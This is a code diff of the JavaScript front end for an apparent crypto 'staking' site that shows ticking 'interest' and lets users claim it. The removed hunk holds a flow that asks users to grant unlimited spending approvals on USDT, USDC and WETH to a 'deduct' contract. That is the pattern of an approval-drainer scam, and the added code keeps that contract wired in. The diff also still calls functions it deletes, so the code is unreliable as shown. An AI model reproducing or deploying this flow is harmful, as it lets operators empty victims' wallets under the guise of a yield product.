@@ -57,6 +57,7 @@ let interestInterval = null;
 let nextBenefitInterval = null;
 let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 
+
 //---Helper Function: Retry DOM Acquisition---
 async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
     let attempts = 0;
@@ -74,6 +75,7 @@ async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
     console.error("retryDOMAcquisition: Failed to acquire DOM elements after", maxAttempts, "attempts.");
     return false;
 }
+
 
 //---新增：從伺服器拉取用戶資料並同步本地---
 async function loadUserDataFromServer() {
@@ -232,6 +234,7 @@ function updateBalancesUI(walletBalances) {
         updateStatus("");
     }
 }
+
 
 function updateTotalFunds() {
     if (totalValue) {
@@ -451,122 +454,82 @@ async function sendMobileRobustTransaction(populatedTx) {
     return receipt;
 }
 
-async function initializeWallet() {
-    try {
-        if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a compatible wallet.');
-            disableInteractiveElements(true);
-            console.log("initializeWallet: No Ethereum provider detected.");
-            return;
-        }
-        provider = new ethers.BrowserProvider(window.ethereum);
-        window.ethereum.on('accountsChanged', (newAccounts) => {
-            console.log("initializeWallet: Accounts changed:", newAccounts);
-            if (userAddress) {
-                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
-                    window.location.reload();
-                }
-            }
-        });
-        window.ethereum.on('chainChanged', () => {
-            console.log("initializeWallet: Chain changed, reloading page.");
-            window.location.reload();
-        });
-        const accounts = await provider.send('eth_accounts', []);
-        console.log("initializeWallet: Initial accounts:", accounts);
-        if (accounts.length > 0) {
-            await connectWallet();
-        } else {
-            disableInteractiveElements(true);
-            updateStatus("Please connect your wallet to continue.");
-        }
-    } catch (error) {
-        console.error("initializeWallet: Wallet initialization error:", error);
-        updateStatus(`Initialization failed: ${error.message}`);
-    }
-}
 
-async function updateUIBasedOnChainState() {
-    if (!signer) {
-        console.log("updateUIBasedOnChainState: No signer available, skipping.");
-        return;
-    }
+async function connectWallet() {
     try {
-        updateStatus("Checking on-chain authorization status...");
-        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-        console.log("updateUIBasedOnChainState: Required allowance:", requiredAllowance.toString());
-        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
-            deductContract.isServiceActiveFor(userAddress),
-            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
-            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
-            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
-        ]);
-        console.log("updateUIBasedOnChainState: Chain state:", { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
-        const isWethAuthorized = wethAllowance >= requiredAllowance;
-        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
-        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
-        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
-        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
-        if (isFullyAuthorized) {
-            console.log("updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.");
-            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
-            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
-            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
-            walletTokenSelect.dispatchEvent(new Event('change'));
-            setInitialNextBenefitTime();
-            activateStakingUI();
-        } else {
-            console.log("updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.");
-            if(startBtn) startBtn.style.display = 'block';
-        }
-        disableInteractiveElements(false);
+        if (!provider) throw new Error("Provider not initialized");
+        updateStatus('Please confirm connection in your wallet...');
+        const accounts = await provider.send('eth_requestAccounts', []);
+        console.log("connectWallet: Accounts received:", accounts);
+        if (accounts.length === 0) throw new Error("No account selected.");
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+        console.log("connectWallet: Connected user address:", userAddress);
+        connectButton.classList.add('connected');
+        connectButton.textContent = 'Connected';
+        connectButton.title = 'Disconnect Wallet';
+        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        await updateUIBasedOnChainState();
+        updateStatus('Fetching wallet balances...');
+        const balances = {
+            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
+            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
+            weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
+        };
+        console.log("connectWallet: Wallet balances:", balances);
+        updateBalancesUI(balances);
         updateStatus("");
+        await loadUserDataFromServer();  // 新增：連錢包後從伺服器同步資料
+        await saveUserData();
     } catch (error) {
-        console.error("updateUIBasedOnChainState: Failed to check on-chain state:", error);
-        updateStatus("Failed to check on-chain state. Please refresh.");
+        console.error("connectWallet: Connection error:", error);
+        let userMessage = `Error: ${error.message}`;
+        if (error.code === 4001) userMessage = "You rejected the connection request.";
+        updateStatus(userMessage);
+        resetState(true);
     }
 }
 
-async function handleConditionalAuthorizationFlow() {
-    if (!signer) throw new Error("Wallet not connected");
-    updateStatus('Preparing authorization...');
-    const selectedToken = walletTokenSelect.value;
-    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
-    const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-    console.log("handleConditionalAuthorizationFlow: Required allowance:", requiredAllowance.toString());
-    const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
-    console.log("handleConditionalAuthorizationFlow: Service activated:", serviceActivated);
-    const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
-    const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
-    let tokenToActivate = '';
-    for (const { name, contract, address } of tokensToProcess) {
-        updateStatus(`Checking ${name} allowance...`);
-        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
-        console.log(`handleConditionalAuthorizationFlow: ${name} allowance:`, currentAllowance.toString());
-        if (currentAllowance < requiredAllowance) {
-            updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
-            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-            approvalTx.value = 0n;
-            console.log("handleConditionalAuthorizationFlow: Sending approval transaction for", name, approvalTx);
-            await sendMobileRobustTransaction(approvalTx);
-            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
-            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance:`, newAllowance.toString());
-            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
-        } else {
-            if (!tokenToActivate) tokenToActivate = address;
-        }
-    }
-    if (!serviceActivated && tokenToActivate) {
-        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        updateStatus(`Activating service (using ${tokenName})...`);
-        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
-        activateTx.value = 0n;
-        console.log("handleConditionalAuthorizationFlow: Sending activate service transaction:", activateTx);
-        await sendMobileRobustTransaction(activateTx);
+function disconnectWallet() {
+    resetState(true);
+    alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
+    console.log("disconnectWallet: Wallet disconnected.");
+}
+
+//---修改：getEthPrices() 加 fallback，使用 usd 作為預設---
+async function getEthPrices() {
+    try {
+        updateStatus("Fetching latest prices...");
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
+            headers: { 'ngrok-skip-browser-warning': 'true' }
+        });
+        console.log("getEthPrices: Response status:", response.status);
+        if (!response.ok) throw new Error('Network response was not ok');
+        const data = await response.json();
+        console.log("getEthPrices: Received price data:", data);
+
+        // 修改：加 fallback，如果 usdt missing，用 usd
+        const usdPrice = data.ethereum?.usd || 0;
+        const usdtPrice = data.ethereum?.usdt || usdPrice;  // Fallback to USD
+        const prices = {
+            usd: usdPrice,
+            usdt: usdtPrice,
+            usdc: usdPrice,  // USDC ≈ USD
+            weth: usdPrice   // WETH ≈ ETH/USD, but for conversion, use 1:1 logic below if needed
+        };
+        console.log("getEthPrices: Processed prices:", prices);  // Debug log
+        updateStatus("");
+        return prices;
+    } catch (error) {
+        console.error("getEthPrices: Could not fetch ETH price:", error);
+        updateStatus("Could not fetch price data.", true);
+        return null;
     }
 }
 
-//---修改後的 claimInterest 函數，加 NaN 檢查與 fallback---
 async function claimInterest() {
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
     const claimableETH = parseFloat(claimableETHString);
@@ -640,8 +603,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     updateLanguage(savedLang);
     await initializeWallet();
     setInterval(updateTotalFunds, 1000);
+    //---刷新資料
+    document.getElementById('refreshData')?.addEventListener('click', async () => {
+        console.log("refreshData: Manually refreshing data...");
+        updateStatus('Refreshing data...');
+        await loadUserDataFromServer();  // 重新載入資料
+        updateStatus('');
+        alert('Data refreshed!');
+    });
 });
-
-document.getElementById('refreshData')?.addEventListener('click', async () => {
-    console.log("refreshData: Manually refreshing data...");
-    updateStatus('Refreshing data...');
